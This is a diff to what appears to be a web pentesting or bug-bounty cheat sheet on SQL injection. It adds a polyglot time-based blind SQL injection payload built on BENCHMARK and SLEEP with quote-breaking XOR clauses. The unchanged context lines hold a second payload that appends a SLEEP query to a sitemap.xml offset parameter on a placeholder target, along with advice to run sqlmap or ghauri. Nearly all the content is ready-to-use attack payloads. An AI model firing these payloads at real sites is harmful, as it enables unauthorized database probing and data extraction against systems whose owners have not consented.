@@ -3,7 +3,9 @@
 - ghauri ==> this is best
 
 
-
+### Ultiamte sql injection payload to test 
+`IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
+`
 ##### SITEMAP
 - sitemap.xml is present? . Try setting ?offset=1 parameter and if content changes, run sqlmap or ghauri   
 - payload for sitemap.xml ==>             target[.]com/sitemap.xml?offset=1;SELECT IF((8303>8302),SLEEP(9),2356)#   ==> output time should be 9
